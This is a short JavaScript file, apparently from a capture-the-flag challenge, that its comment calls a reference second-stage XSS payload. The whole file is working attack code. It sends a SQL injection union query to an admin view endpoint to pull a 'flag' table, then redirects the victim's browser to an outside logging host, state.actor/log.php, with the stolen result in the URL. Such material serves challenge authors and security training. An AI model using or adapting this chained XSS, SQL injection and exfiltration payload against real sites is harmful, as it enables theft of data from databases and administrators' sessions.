// Not an automated test. Just a reference.
// 2nd stage XSS payload to exfiltrate flag
url = "http://192.168.1.159:5000/admin/view/"+encodeURIComponent("0 union select 1,(select flag from flag),3,4,5")
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
   if (xmlhttp.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
      if (xmlhttp.status == 200) {
          d = xmlhttp.responseText;
          document.location="http://state.actor/log.php?FLAG="+encodeURIComponent(d);
      }   
      else {
          document.location="http://state.actor/log.php?ERR="+xmlhttp.status;
      }   
   }   
};

xmlhttp.open("GET", url, true);
xmlhttp.send();

